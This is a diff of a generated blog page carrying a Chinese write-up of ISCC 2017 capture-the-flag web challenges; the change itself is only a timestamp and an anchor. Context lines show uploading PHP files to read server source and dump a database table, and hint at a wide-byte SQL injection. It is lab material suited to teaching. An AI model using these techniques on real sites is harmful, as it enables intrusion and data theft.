@@ -18,7 +18,7 @@
 <meta property="og:image" content="/2017/05/25/ISCC-2017-Web-writeup/1.png">
 <meta property="og:image" content="/2017/05/25/ISCC-2017-Web-writeup/2.png">
 <meta property="og:image" content="/2017/05/25/ISCC-2017-Web-writeup/3.png">
-<meta property="og:updated_time" content="2017-10-04T09:17:05.690Z">
+<meta property="og:updated_time" content="2018-03-03T18:24:53.166Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ISCC_2017_Web_writeup">
 <meta name="twitter:description" content="Web签到题，来和我换flag啊！POST提交三个f1ag，可在response中拿到flag。  WelcomeToMySQLF12发现数据库信息在../base.php。上传php5 123&amp;lt;?phpshow_source(&quot;../base.php&quot;);?&amp;gt; 访问upload/xxx.php可拿到base.php源码。再上传一个php5连接数据库可拿到flag。 123456&amp;lt">
@@ -211,6 +211,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="string">"../base.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>访问upload/xxx.php可拿到base.php源码。<br>再上传一个php5连接数据库可拿到flag。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"iscc2017"</span>, <span class="string">"iscc2017"</span>);</div><div class="line">mysql_select_db(<span class="string">"flag"</span>,$conn);</div><div class="line">$result = mysql_query(<span class="string">"select * from flag"</span>);</div><div class="line">var_dump(mysql_fetch_row($result));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<a id="more"></a>
 <h2 id="where-is-your-flag"><a href="#where-is-your-flag" class="headerlink" title="where is your flag"></a>where is your flag</h2><p>访问flag.php发现hint:thisisflag。可知在表flag中有字段名为thisisflag。尝试GET请求<code>id=1</code>，页面返回正常;请求<code>id=2-1</code>，返回空白页面，可猜测，sql语句为</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foobar <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$_GET['</span><span class="keyword">id</span><span class="string">']'</span></div></pre></td></tr></table></figure>
 <p>测试可知为宽字节注入,且需要转换编码为gbk:</p>
